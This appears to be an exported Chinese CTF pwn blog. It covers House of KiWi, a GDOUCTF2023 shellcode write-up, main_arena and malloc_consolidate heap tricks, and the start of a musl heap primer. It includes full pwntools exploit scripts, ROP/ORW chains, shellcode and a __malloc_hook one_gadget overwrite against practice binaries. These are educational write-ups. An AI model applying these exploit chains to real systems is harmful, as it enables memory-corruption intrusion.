KiWi","slug":"House-of-KiWi","date":"2023-04-18T13:49:59.000Z","updated":"2023-09-14T17:19:36.000Z","comments":true,"path":"2023/04/18/House-of-KiWi/","link":"","permalink":"http://example.com/2023/04/18/House-of-KiWi/","excerpt":"","text":"一种基于setcontext来在开启沙盒的堆题中实现orw的利用链 对于libc2.29以后的版本 setcontext控制rsp寄存器的值由rdi寄存器转化为了rdx寄存器 相比之很容易控制的rdi寄存器 rdx寄存器要想修改为我们预期的值 还是比较麻烦的 我们之前有提到的一种办法是利用libc文件中可以借rdi寄存器来控制rdx寄存器 但是今天这条链可以直接控制rdx寄存器 下面就来学习一下 实现逻辑分析整条链的实现逻辑主要是基于fflush(stderr)这个函数的调用 函数的内部调用了_IO_file_sync函数 并且其rdx寄存器的值恒为 _IO_helper_jumps由图上我们很容易能看出IO_file_sync函数的调用是基于rbp寄存器的寻址 而rbp寄存器的值恒为IO_file_jumps 所以如果我们能够修改其地址+0x60处为setcontext 即可 并且rdx寄存器此时的值也被我们熟知 如果我们修改其+0xa0和0xa8处为相对的地址 就可以达到劫持程序执行流的目的（setcontext部分的知识本文不会重复介绍） 问题在于如何调用到fllush函数 static void__malloc_assert (const char *assertion, const char *file, unsigned int line, const char *function)&#123;(void) __fxprintf (NULL, &quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\\n&quot;, __progname, __progname[0] ? &quot;: &quot; : &quot;&quot;, file, line, function ? function : &quot;&quot;, function ? &quot;: &quot; : &quot;&quot;, assertion);fflush (stderr);abort ();&#125; assert是一个断言函数 实际作用和if差不多 起到判断的作用 通过调用assert函数可以涉及到__malloc_assert函数的调用 所以此时我们的目标转化为调用assert函数 一共有两种办法 一种是基于top chunk 一种是基于largebin chunk 通过top chunk先来讲前者 我们知道 对于小于阈值的chunk 如果bin中没有合适的chunk 就会从top chunk中分割来分配 如果申请的chunk大小比top chunk大呢 这种情况top chunk就会调用sysmalloc函数 在这个函数中 存在着对于assert的调用 assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)); 我们来进行源码调试 这样可以更好的理解这个判断式 转化为汇编形式 实际上就是对应着这四个判断 只有成功跳转到sysmalloc+1829 &lt;sysmalloc+1829&gt; 才能够触发__malloc_assert函数 首先第一个cmp判断 对比r14寄存器的值和rsp+8处的内容 显然前者小于后者 并且这个判断式是固然的 不会因为用户的操作而改变(常规情况下) 此时ZF标志位为0 jnz跳转 第二个cmp判断 对比r12寄存器和0x1f 这里的0x1f实际上也就是最小chunk大小-1 用来判断top chunk剩余的size还够不够组成一个chunk 此时r12寄存器的值为 这个值其实不是固定的 还得根据你覆盖top chunk的size来决定 比如此时我覆盖top chunk的size就是0x100 如果我们此时就覆盖top chunk的size小于0x1f 那么CF标志位就会被设置为1 jbe就会跳转 不过这样就看不到第三个判断式了 所以我并未选择在此处跳转 我们来看一下第三个判断 利用test指令将al寄存器与1进行与运算 如果al寄存器的值为1 那么与运算的结果为1 ZF寄存器为0 此时je也不会跳转 al寄存器是ax寄存器的低8位 而ax寄存器是eax寄存器的低16位 eax寄存器是rax寄存器的低32位 所以此时al寄存器的值差不多就是size域的Inuse位吧 差不多可以这么理解 这里其实Inuse位设置为0就能跳转了 但是同上对吧 我还需要演示第四个判断 首先是利用lea 赋值r13-1给rax 随后test 把r11和rax进行与运算 这里的rax固定是0x1000-1 0x1000是一页的大小 r11则为top chunk的首地址 其实这里的与运算结果是必定不为0的 ZF标志位为0 jne跳转 上面的四个判断 总结下来 其实只要我们覆盖top chunk的size域 使其大小不足以分配我们申请的大chunk即可 就能进入__malloc_assert函数 不需要像网上其他教程所说的一定要修改Inuse位 通过largebin chunk&#123; victim_index = largebin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; /* maintain large bins in sorted order */ if (fwd != bck) &#123; /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ assert (chunk_main_arena (bck-&gt;bk)); 主要是通过这段源码中的assert函数 触发的条件是释放一个chunk到largebin中 并且对应链表中已经存在一个chunk 还是来源码调试 看一看需要满足什么样的判断才能进入__malloc_assert函数 将r12+8赋值给rax 此时r12的值为链表中已经存在的chunk的首地址 +8处则为size域 接着将al寄存器和4进行与运算 此时al寄存器的值为size域的最后一个字节 此时我的值为0x25 这里可能存在疑问 为什么是5结尾 常规的chunk不是根据Inuse位有所不同吗 但也仅仅只是0和1 这里是因为要想和4进行与运算后 ZF标志位为0 使得jnz能够跳转 就需要相应的倒数第三位值为1 才能满足条件 而倒数第三位为1也就是增加了4 所以此时在0x21的基础上需要加上4 也就得到了0x25 随后就可以成功跳转 执行__malloc_assert函数 所以通过largebin bin来执行malloc_assert函数的关键在于修改链表中的chunk的size域倒数第三位为1 实际利用下面演示的程序由本人自己编写 存在许多明显漏洞 包括但不限于UAF 堆溢出 其他比赛题目需要根据真实情况作修改 下文不做模板使用 演示虚拟机:ubuntu22.04 使用的libc版本为libc2.32 首先 获取要用到的一些地址 libc由我程序自带的漏洞函数泄露 libc_addr = get_libc()setcontext_addr = libc_addr + 0x5306DIO_helper_jumps = libc_addr + 0x1e48c0IO_file_jumps = libc_addr + 0x1e54c0open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]rdi_addr = libc_addr + next(libc.search(asm(&#x27;pop rdi;ret;&#x27;)))rsi_addr = libc_addr + next(libc.search(asm(&#x27;pop rsi;ret;&#x27;)))rdx_r12_addr = libc_addr + 0x0000000000114161ret_addr = 0x000000000040101asuccess(hex(rdi_addr)) 接着 按照上面所说的 我们需要利用fllush函数中涉及到的call qword ptr [rbp+0x60] 而rbp的值默认为IO_file_jumps 所以只需要利用任意写修改IO_file_jumps+0x60处为想要调用的地址 这里也就是setcontext+61 我采用的办法是tcache attack 不过由于libc2.32新增了fd异或 所以需要先泄露堆地址 add(0x10)#0add(0x10)#1delete(0)show(0)io.recv()key = u64(io.recvuntil(&quot;\\n&quot;,drop = True).ljust(8,b&#x27;\\x00&#x27;))success(&quot;key :&quot;+hex(key))delete(1)edit(1,8,p64((IO_file_jumps+0x60)^key))add(0x10)#2add(0x10)#3edit(3,8,p64(setcontext_addr)) 其次是设定rdx+0xa0和0xa8处为我们想要的数据 以此来控制rsp寄存器和最后ret返回的地址 默认开启了沙盒 所以此时我们构造的rop链采用orw的形式 add(0x20)#4add(0x20)#5delete(4)delete(5)edit(5,8,p64((IO_helper_jumps+0xa0)^key))add(0x20)#6add(0x20)#7edit(6,8,b&#x27;./flag\\x00\\x00&#x27;)flag_addr = key*0x1000 + 0x310success(hex(flag_addr))payload = p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(0)+p64(open_addr)payload += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(elf.bss(0x500))+p64(rdx_r12_addr)+p64(0x100)+p64(0)+p64(read_addr)payload += p64(rdi_addr)+p64(1)+p64(rsi_addr)+p64(elf.bss(0x500))+p64(rdx_r12_addr)+p64(0x100)+p64(0)+p64(write_addr)add(0x100)#8edit(8,len(payload),payload)chunk8_addr = key*0x1000+0x340edit(7,0x10,p64(chunk8_addr)+p64(ret_addr)) 最后就是通过修改修改largebin chunk的size域 以及来触发__malloc_assert函数 add(0x10)#9add(0x410)#10add(0x10)#11delete(10)add(0x420)#12add(0x420)#13delete(12)payload = cyclic(0x18)+p64(0x425)edit(9,len(payload),payload)gdb.attach(io,&#x27;b *0x4013EF&#x27;)pause(0)add(0x430)#14pause() 如果采用的是修改top chunk的size域 使其不够分配chunk 进入sysmalloc函数 则为 add(0x10)#9payload = cyclic(0x18)+p64(0x101)edit(9,len(payload),payload)gdb.attach(io,&#x27;b *0x4013EF&#x27;)pause(0)add(0x1000)pause() 完整esp: from pwn import*io = process(&quot;./heap&quot;)elf = ELF(&quot;./heap&quot;)libc = ELF(&quot;./glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]def debug(): gdb.attach(io) pause()def add(size): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;You can customize the size of chunk, but what about your life&quot;) io.sendline(str(size))def delete(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;I didn&#x27;t set the pointer to zero, just like some things can&#x27;t be repeated&quot;) io.sendline(str(index))def edit(index,size,payload): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;It&#x27;s never too late to start again. What do you regret?&quot;) io.sendline(str(index)) io.recvuntil(&quot;You all know that there can be overflows here, so why do you set limits on your life?&quot;) io.sendline(str(size)) io.recvuntil(&quot;Come back!&quot;) io.send(payload)def show(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;You can&#x27;t live a perfect life without making any effort&quot;) io.sendline(str(index))def get_libc(): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&#x27;5&#x27;) io.recv() libc_addr = int(io.recv(14),16) - libc.sym[&#x27;puts&#x27;] success(&quot;libc_addr :&quot;+hex(libc_addr)) return libc_addrlibc_addr = get_libc()setcontext_addr = libc_addr + 0x5306DIO_helper_jumps = libc_addr + 0x1e48c0IO_file_jumps = libc_addr + 0x1e54c0open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]rdi_addr = libc_addr + next(libc.search(asm(&#x27;pop rdi;ret;&#x27;)))rsi_addr = libc_addr + next(libc.search(asm(&#x27;pop rsi;ret;&#x27;)))rdx_r12_addr = libc_addr + 0x0000000000114161ret_addr = 0x000000000040101asuccess(hex(rdi_addr))add(0x10)#0add(0x10)#1delete(0)show(0)io.recv()key = u64(io.recvuntil(&quot;\\n&quot;,drop = True).ljust(8,b&#x27;\\x00&#x27;))success(&quot;key :&quot;+hex(key))delete(1)edit(1,8,p64((IO_file_jumps+0x60)^key))add(0x10)#2add(0x10)#3edit(3,8,p64(setcontext_addr))add(0x20)#4add(0x20)#5delete(4)delete(5)edit(5,8,p64((IO_helper_jumps+0xa0)^key))add(0x20)#6add(0x20)#7edit(6,8,b&#x27;./flag\\x00\\x00&#x27;)flag_addr = key*0x1000 + 0x310success(hex(flag_addr))payload = p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(0)+p64(open_addr)payload += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(elf.bss(0x500))+p64(rdx_r12_addr)+p64(0x100)+p64(0)+p64(read_addr)payload += p64(rdi_addr)+p64(1)+p64(rsi_addr)+p64(elf.bss(0x500))+p64(rdx_r12_addr)+p64(0x100)+p64(0)+p64(write_addr)add(0x100)#8edit(8,len(payload),payload)chunk8_addr = key*0x1000+0x340edit(7,0x10,p64(chunk8_addr)+p64(ret_addr))# add(0x10)#9# payload = cyclic(0x18)+p64(0x101)# edit(9,len(payload),payload)# gdb.attach(io,&#x27;b *0x4013EF&#x27;)# pause(0)# add(0x1000)# pause()add(0x10)#9add(0x410)#10add(0x10)#11delete(10)add(0x420)#12add(0x420)#13delete(12)payload = cyclic(0x18)+p64(0x425)edit(9,len(payload),payload)gdb.attach(io,&#x27;b *0x4013EF&#x27;)pause(0)add(0x430)#14pause() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"GDOUCTF2023","slug":"GDOUCTF2023","date":"2023-04-17T14:12:33.000Z","updated":"2023-09-14T17:19:06.000Z","comments":true,"path":"2023/04/17/GDOUCTF2023/","link":"","permalink":"http://example.com/2023/04/17/GDOUCTF2023/","excerpt":"","text":"这次的pwn出的比较简单 也就最后一题值得拿来说一说 但是其本质也就是非常简单的手写shellcode Random 保沙盒护基本全关了 但是开启了沙盒 ida看一下伪代码 int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // eax int v5; // [rsp+0h] [rbp-10h] BYREF int v6; // [rsp+4h] [rbp-Ch] int v7; // [rsp+8h] [rbp-8h] int i; // [rsp+Ch] [rbp-4h] setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); v7 = 100; sandbox(); v3 = time(0LL); srand(v3); for ( i = 0; i &lt; v7; ++i ) &#123; v6 = rand() % 50; puts(&quot;please input a guess num:&quot;); if ( (unsigned int)__isoc99_scanf(&quot;%d&quot;, &amp;v5) == -1 ) exit(0); if ( getchar() != 10 ) exit(1); if ( v6 == v5 ) &#123; puts(&quot;good guys&quot;); vulnerable(); &#125; else &#123; puts(&quot;no,no,no&quot;); &#125; &#125; return 0;&#125; 考察了一个伪随机数 用时间当种子 对的话就进入vulnerable函数 伪随机数考烂了都 这里就不讲了 直接来看vulnerable函数 ssize_t vulnerable()&#123; char buf[32]; // [rsp+0h] [rbp-20h] BYREF puts(&quot;your door&quot;); return read(0, buf, 0x40uLL);&#125; 当纯的一个栈溢出漏洞 不过观察了函数表 还发现了个haha函数 里面有一个jmp rsp指令 .text:000000000040094A haha proc near.text:000000000040094A ; __unwind &#123;.text:000000000040094A push rbp.text:000000000040094B mov rbp, rsp.text:000000000040094E jmp rsp.text:000000000040094E haha endp 那么很明显了 没有开启NX保护机制 再加上有jmp rsp 就可以实现手写shellcode的一次执行 jmp指令实际上就是将rip指针跳转到rsp指针指向的地址 我们的jmp rsp指令覆盖的是ret addr shellcode是在retaddr的下一个字长处 此时ret指令弹出jmp rsp到rip寄存器中 rsp指针+8 也就指向了shellcode的起始地址 从而jmp rsp将rip寄存器指向shellcode的起始地址 接着就是如何构造shellcode了 既然没有开启NX保护 又开启了沙盒 想直接获取shell显然是行不通了 只能通过orw的办法 这里有两种实现的逻辑 一种是采用shellcode的orw 一种是构造rop链的orw 不过显然后者的利用更加麻烦 需要更多的步骤 于是这里采用前者 对于第二次shellcode要写在哪里 这里遇到了个小问题 在比赛的时候采用的是ubuntu18的机子 libc文件采用的是本地的libc vmmap查看到的内存空间中 0x601000到0x602000这一个页是有rwx权限的 可以供我们存放第二次shellcode 不过编写这次的wp的时候采用的是ubuntu20的机子 哪怕我把libc更换成了ubuntu18同款 但是0x601000到0x602000却没有可执行权限 也是非常神奇 既然这样就采用原本做题的时候废弃的一个解法 在栈上写第二次shellcode 比赛的时候第一次的exp也是这种做法 不过最后因为远程和本地的libc差异导致偏移不同 最后也没有打通 不过本地复现重要的是掌握这题的知识点 所以倒也无所谓 shellcode = &quot;&quot;&quot;xor eax,eaxshl edx,12syscallsub rsp,0x30jmp rsp&quot;&quot;&quot; 首先设置异或清空eax寄存器 随后利用shl逻辑左移 扩大edx的值 随后syscall 调用read函数 此时read函数写入数据的地址和rsp指针指向的地址 我们来查看一下 可以看到差值是0x30 如果我们在执行完read以后 把rsp指针往低地址处挪动 随后再来一句jmp rsp 就可以执行第二次shellcode 第二次shellcode也就是为了达到orw效果 shellcode = asm(&#x27;&#x27;&#x27; push 0x67616c66 mov rdi,rsp xor esi,esi push 2 pop rax syscall mov rdi,rax mov rsi,rsp mov edx,0x100 xor eax,eax syscall mov edi,1 mov rsi,rsp push 1 pop rax syscall &#x27;&#x27;&#x27;) 剩下的就没什么好说了 完整exp: from pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;node.yuzhian.com.cn&quot;,32980)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()seed = libc.time(0)libc.srand(seed)io.recvuntil(&quot;please input a guess num:&quot;)buf = libc.rand()%50io.sendline(str(buf))io.recvuntil(&quot;your door&quot;)shellcode = &quot;&quot;&quot;xor eax,eaxshl edx,12syscallsub rsp,0x30jmp rsp&quot;&quot;&quot;jmp_rsp = 0x000000000040094epayload = cyclic(0x28)+p64(jmp_rsp)+asm(shellcode)gdb.attach(io,&#x27;b *0x400949&#x27;)pause(0)io.send(payload)shellcode = asm(&#x27;&#x27;&#x27; push 0x67616c66 mov rdi,rsp xor esi,esi push 2 pop rax syscall mov rdi,rax mov rsi,rsp mov edx,0x100 xor eax,eax syscall mov edi,1 mov rsi,rsp push 1 pop rax syscall &#x27;&#x27;&#x27;)io.send(shellcode)pause() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"main_arena利用","slug":"main-arena利用","date":"2023-04-11T14:54:42.000Z","updated":"2023-09-14T17:19:56.000Z","comments":true,"path":"2023/04/11/main-arena利用/","link":"","permalink":"http://example.com/2023/04/11/main-arena%E5%88%A9%E7%94%A8/","excerpt":"","text":"配合fastbin的一种攻击办法 fastbin主要是受限于size域的检测不能随便任意写 main_arena的存在弥补了这一缺点 下面来详细介绍一下 main_arena源码分析struct malloc_state&#123; /* Serialize access. */ __libc_lock_define (, mutex); /* Flags (formerly in max_fast). */ int flags; /* Set if the fastbin chunks contain recently inserted free blocks. */ /* Note this is a bool but not all targets support atomics on booleans. */ int have_fastchunks; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; glibc中的arena就是基于malloc_state这个结构体表示的 其大部分都无需我们深入了解 有两个部分值得我们重点关注和利用 fastbinsY数组和top指针 可以看到 此时蓝框中的内容和fastbin链表上链表尾的chunk是一致的 同时红框代表的是top chunk的addr 实际利用我们知道 限制fastbin attack任意写的根本在于size域的检测 但是利用fastbin链表头对于main_arena的影响不知道你有没有什么思路 如果我们利用double free 将原本的ptr_addr改为size 就可以达到满足size域的检测 add(0x10)add(0x10)delete(0)delete(1)delete(0)add(0x10)edit(2,8,p64(0x21))add(0x10)add(0x10) 此时用同样的方法 就可以获取到main_arena的chunk libc_addr = gift()add(0x10)#0add(0x10)#1delete(0)delete(1)delete(0)add(0x10)#2edit(2,8,p64(0x31))add(0x10)#3add(0x10)#4add(0x20)#5add(0x20)#6main_arena_addr = libc_addr + (0x7f62971c4b20-0x7f6296e00000)delete(5)delete(6)delete(5)add(0x20)#7edit(7,8,p64(main_arena_addr))add(0x20)#8add(0x20)#9add(0x20)#10 为了方便调试 所以libc基址我的调试程序自带了一个函数提供 可以看到 此时的main_arena满足了申请一个0x20大小的chunk 于是我们的chunk10就劫持了这片区域 当然光靠这些当然攻击效果不显著 我们的目标是任意写 不知道你还记不记得正常分配一个chunk是如何进行的 chunk初始化后 如果bin中没有合适的chunk 那么就是通过分割top chunk来分配 而你还记不记得 top chunk的起始地址是存放在main_arena中的 如果我们把其覆盖为ptr_addr 就可以达到任意写的目的 并且通过上述的办法 我们已经获得了在main_arena上申请chunk的能力 只需要对上述的size进行扩大 使其能够覆盖到top chunk即可 如果题目对于chunk的大小进行了限制 仍然可以通过套娃的办法来延申可控制的范围 libc_addr = gift()add(0x10)#0add(0x10)#1delete(0)delete(1)delete(0)add(0x10)#2edit(2,8,p64(0x81))add(0x10)#3add(0x10)#4add(0x70)#5add(0x70)#6main_arena_addr = libc_addr + (0x7f62971c4b20-0x7f6296e00000)delete(5)delete(6)delete(5)add(0x70)#7edit(7,8,p64(main_arena_addr))add(0x70)#8add(0x70)#9add(0x70)#10malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]payload = p64(0)*9 + p64(malloc_hook-0x10)edit(10,len(payload),payload)add(0x20)#11onegadget_addr = libc_addr + 0x4527aedit(11,8,p64(onegadget_addr))add(0x20)#12io.interactive() 这里的chunk10就是控制main_arena上的top chunk 此时再次申请一个chunk11 获得的就是malloc_hook处的空间 但是不知道为啥0x10大小的chunk貌似不行 有待研究 随后就是触发onegadget获得shell 上述的exp属于有很多漏洞的题目 具体题目需要用到这种办法还需要自己研究 总结一下还是比较简单的一个小tip if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"malloc_consolidate利用","slug":"malloc-consolidate利用","date":"2023-04-11T04:21:22.000Z","updated":"2023-09-14T17:19:58.000Z","comments":true,"path":"2023/04/11/malloc-consolidate利用/","link":"","permalink":"http://example.com/2023/04/11/malloc-consolidate%E5%88%A9%E7%94%A8/","excerpt":"","text":"比较强大的一个漏洞 触发的条件很常见 但是效果却很强大 在做NKCTF2023的时候作为压轴题考察了 后来才知道是原题 heapstorm zero malloc_consolidate()核心的利用就是依靠这个函数 这个函数有两种作用 第一是可以合并fastbinchunk 第二个是对于堆进行初始化 在学习fastbin中 我们知道 chunk被释放到fastbin后 其next chunk的Inuse位是不会被置零的 也就不会存在合并chunk这种利用方法 但是malloc_consolidate函数却可以实现合并fastbin的效果 按照上图的情形 此时触发malloc_consolidate函数 chunk0就会被放入到unsortedbin中 随后根据大小分配到smallbin中 我们先来讲其实现逻辑 触发条件稍等讲 if (get_max_fast () != 0) &#123; ...&#125;else &#123; malloc_init_state(av); check_malloc_state(av);&#125; 函数开始执行时 会对于get_max_fast ()的返回值进行判断 如果进程是第一次调用malloc函数时 其返回值为0 此时就会进行堆初始化工作 如果堆已经初始化完成 此时会调用clear_fastchunks函数清空fastbin的Inuse位 接着会进行一个嵌套循环 第一次循环遍历fastbin数组 得到链表 随后遍历链表 得到free chunk /* Remove each chunk from fast bin and consolidate it, placing it then in unsorted bin. Among other reasons for doing this, placing in unsorted bin avoids needing to calculate actual bins until malloc is sure that chunks aren&#x27;t immediately going to be reused anyway.*/maxfb = &amp;fastbin (av, NFASTBINS - 1);fb = &amp;fastbin (av, 0);do &#123; p = atomic_exchange_acq (fb, NULL); if (p != 0) &#123;do &#123; check_inuse_chunk(av, p); nextp = p-&gt;fd;...&#125; while ( (p = nextp) != 0); &#125;&#125; while (fb++ != maxfb); 对于合并来说 首先是考虑向后合并 这里的向后合并指的是向低地址处 顺便复习一下向后合并的条件 其会对当前chunk的Inuse位进行判断 是否可以和物理相邻低地址处的chunk合并 接着通过prev_size位来索引prev_chunk的地址 修改其size为合并后的总和 随后让chunk进入unlink函数 常见的就是topchunk合并 图例下面一并讲 随后进入向前合并的分支 首先判断物理相邻高地址处的chunk是否为top chunk 如果为top chunk 则top chunk直接触发向后合并 如下所示布局堆 add(0x10)delete(0)malloc_consolidate() 如果nextchunk不为top chunk的话 则正式进入向前合并 /* consolidate forward */if (!nextinuse) &#123; unlink(av, nextchunk, bck, fwd); size += nextsize;&#125; else clear_inuse_bit_at_offset(nextchunk, 0); 首先先索引到nextchunk 再索引到nextchunk的nextchunk 根据其的Inuse位来判断是否nextchunk被释放 如果被释放 如下图所示 那么就会合并chunk0和chunk1 如何触发malloc_consolidate函数的强大功能我们上面已经了解到了 利用这一函数 可以轻松的获取smallbin或者largebin中的chunk 对于有些题目来说 其会对申请chunk的size进行限制 利用这一函数就可以绕过限制 仍然获得释放chunk到这两个bin中的机会 首先我们要知道 c语言中的标准输出和标准输入和标准错误都有着缓冲区 只不过其各自遵守的缓冲区原则不同 具体的可以去看我相关博客 这里只需要知道 哪怕大部分的程序都会将缓冲区设置为无缓冲模式 但是如果scanf函数一次性读入过多的字符串 其还是会调用malloc申请一个大chunk 而很多堆题 鉴于出题人的出题习惯或者是疏忽 在菜单页时选择的选项是由scanf函数来的 这也解决了我刚学堆时的疑问 为什么大部分都要用到atoi函数来中转 而不选择scanf直接读 io.recvuntil(&quot;&gt;&quot;)io.sendline(b&#x27;1&#x27;*0x1000) 就以这题举例 此时利用scanf读入0x1000字节的‘1’ 在此之前 没有进行任何的malloc调用 理论来说 此时heap应该还没有被初始化 但是在gdb中 我们是可以索引到top chunk的 接着来查看一下top chunk的内容 可以看到都是1 也就是说其申请了一个大chunk用来存放过多的字符串 随后释放到bin中和top chunk合并了 通过这个办法 就可以调用到malloc_consolidate 不过具体的调用流程我也不清楚 尝试过源码调试 但是也不知道打断点在哪里 怎样利用可以用来利用的点 一个是刚才提到的 有些题目会对chunk的大小进行限制 从而没有办法释放chunk到unsortedbin 泄露libc基址 利用这种办法 只要是可以释放到fastbin中的chunk 都能进入unsortedbin 第二点 还需要一个特性相辅相成 不知道你有没有留意 在我们先前讲到的向前合并或者是向后合并 其是如何索引prev_chunk和next_chunk的呢 无非就是利用chunk头的那两个数值 size域就不动什么歪脑经了 修改后整个heap结构都会变化 那么目标自然是放在prev_size上了 你可能会想到利用堆溢出来覆盖prev_size 这个办法自然可行 不过我们先来观察一下利用malloc_consolidate形成的smallbin chunk for i in range(11): add(0x18) #0 - 10for i in range(0,10): delete(i)bigchunk() 可以看到 虽然其合并成了一个0x140大小的chunk 但是在其内部 实际上还保留着原本chunk各自的size 并且size的值也可以表明是向后合并 基于这种数值的残留 存在着chunk overlap 下面跟着我一步步来看如何实现 for i in range(11): add(0x18) #0 - 10for i in range(1,10): delete(i)bigchunk()payload = cyclic(0x18)+p64(0x100)edit(0,len(payload),payload) 此时的堆结构如图所示 可以看到此时的smallbin已经被拆分成蓝框中的两个chunk了 我们利用chunk0溢出将chunk1的size域修改为0x100后 由于0xe4b020处残留着代表0x20大小的chunk头 所以形成了上图的情形 这样做的目的何在呢 可以看到此时最后一个chunk的prev_size为0x120 如果我们将其释放后 再利用malloc_consolidate就会索引到smallbin中的chunk 从而触发向后合并 这样做的用意在于保留堆块指针 获得chunk overlap add(0x38)#11add(0x38)#12add(0x38)#13 0xa0add(0x38)#14 0xe0 此时我们再次申请四个0x38大小的chunk 此时将smallbin瓜分完毕 随后我们释放前两个chunk 并且将其释放到smallbin中(其实一个也行 只要构造一个smallbin就行了 无关大小) 如果我们此时释放0x1ad4140这个chunk 其prev_size也就是0x120 索引到的就是smallbin 就会和其合并 从而中间的两个chunk的指针就会保留下来 如果我们再次申请 就会成功chunk overlap delete(10)bigchunk() 完整: for i in range(11): add(0x18) #0 - 10payload = cyclic(0x10)+p64(0x100)edit(8,len(payload),payload)for i in range(1,10): delete(i)bigchunk()payload = cyclic(0x18)+p64(0x100)edit(0,len(payload),payload)add(0x38)#11add(0x38)#12add(0x38)#13 0xa0add(0x38)#14 0xe0delete(11)delete(12)bigchunk()delete(10)bigchunk() ps: 大部分利用到这样攻击手法的 都没有堆溢出或者是UAF 所以上述的一些操作只是我为了方便演示 受限于情况需要另说 比如覆盖size域就可以通过off by null if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"musl","slug":"musl","date":"2023-04-01T03:26:44.000Z","updated":"2023-09-14T17:20:10.000Z","comments":true,"path":"2023/04/01/musl/","link":"","permalink":"http://example.com/2023/04/01/musl/","excerpt":"","text":"前言musl是一个轻量型的c标准库 与以往我们一直接触的glibc相比 其只需要一个libc.so文件 并且其源代码远远小于glibc 在近几年的ctf比赛中 偶尔会出现基于musl的堆题 musl的堆题和glibc的堆题可谓是牛马不相干 所以本文将详细介绍 所采取的libc.so版本为1.2.3 1.1.x与1.2.x版本有比较大的改动 需要注意一下 调试环境安装pwndbg就不需要我说明了 但是由于musl和glibc的结构体索引不同 所以常规的heap和bin指令并不能使用 xf1les师傅有编写一款gdb插件 可以供我们调试musl堆 git clone https://github.com/xf1les/muslheap.gitecho &quot;source /path/to/muslheap.py&quot; &gt;&gt; ~/.gdbinit musl源码可以在下面的地址查找下载 并且通过以下指令编译 https://musl.libc.org/releases/sudo dpkg -i musl_1.2.2-1_amd64.deb 源码分析在musl中 有三级结构来管理堆 从小到大为 chunk group meta 先来看chunk的构成 struct chunk&#123; char prev_user_data[]; uint8_t idx; //低5bit为idx第几个chunk uint16_t offset; //与第一个chunk起始地址的偏移，实际地址偏移为offset * UNIT,详细请看get_meta源码中得到group地址的而过程！ char data[];&#125;; 就用这三个chunk来说明吧 第一个chunk和后面两个chunk都不一样 其首地址存放了一个堆地址 这是因为其上面是group结构 所以和后面的chunk不同 接着蓝框部分就是idx 而红框部分则是offset 这里可以看出UNIT实际上是0x10 #define UNIT 16#define IB 4struct group &#123; struct meta *meta; unsigned char active_idx:5; char pad[UNIT - sizeof(struct meta *) - 1];//padding=0x10B unsigned char storage[];// chunks&#125;; 接着是group结构 